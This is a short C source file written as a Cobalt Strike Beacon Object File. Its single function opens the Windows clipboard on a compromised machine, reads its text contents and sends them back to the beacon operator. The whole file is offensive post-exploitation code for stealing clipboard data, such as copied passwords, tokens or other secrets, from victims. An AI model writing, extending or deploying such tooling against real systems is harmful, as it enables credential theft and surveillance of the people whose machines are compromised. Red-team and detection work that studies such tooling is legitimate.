
#include <Windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT BOOL WINAPI USER32$CloseClipboard();
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT);


void go() {
	
	
	BOOL res = USER32$OpenClipboard(NULL);
	if (res == 0) { return; }
	
	
	HANDLE handle1= USER32$GetClipboardData(CF_TEXT);
	
	if (handle1) {
		BeaconPrintf(CALLBACK_OUTPUT,"Clipboard: %s\n", handle1);
	}



	USER32$CloseClipboard();


}
